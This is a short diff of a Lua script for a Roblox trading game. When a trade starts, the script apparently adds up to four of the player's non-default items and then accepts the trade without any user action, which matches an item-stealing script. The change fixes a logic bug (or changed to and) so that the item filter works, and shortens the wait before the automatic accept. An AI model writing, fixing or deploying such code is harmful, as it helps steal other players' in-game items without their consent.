@@ -274,7 +274,8 @@ g.Trade.StartTrade.OnClientEvent:Connect(
             for w, x in pairs(J.Items.Main:GetChildren()) do
                 for w, x in pairs(x.Items.Container.Current.Container:GetChildren()) do
                     if x:IsA("Frame") then
-                        if x.ItemName.Label.Text ~= "Default Knife" or x.ItemName.Label.Text ~= "Default Gun" then
+                        -- Corrected condition with 'and'
+                        if x.ItemName.Label.Text ~= "Default Knife" and x.ItemName.Label.Text ~= "Default Gun" then
                             if M ~= 4 then
                                 M = M + 1
                                 LoopsItem = 1
@@ -291,7 +292,7 @@ g.Trade.StartTrade.OnClientEvent:Connect(
                     end
                 end
             end
-            wait(11)
+            wait(10)
             game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
         else
             local L = 0
@@ -300,7 +301,8 @@ g.Trade.StartTrade.OnClientEvent:Connect(
             for w, x in pairs(J.Items.Main:GetChildren()) do
                 for w, x in pairs(x.Items.Container.Current.Container:GetChildren()) do
                     if x:IsA("Frame") then
-                        if x.ItemName.Label.Text ~= "Default Knife" or x.ItemName.Label.Text ~= "Default Gun" then
+                        -- Corrected condition with 'and'
+                        if x.ItemName.Label.Text ~= "Default Knife" and x.ItemName.Label.Text ~= "Default Gun" then
                             if M ~= 4 then
                                 M = M + 1
                                 LoopsItem = 1
@@ -317,7 +319,7 @@ g.Trade.StartTrade.OnClientEvent:Connect(
                     end
                 end
             end
-            wait(11)
+            wait(10)
             game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
         end
     end
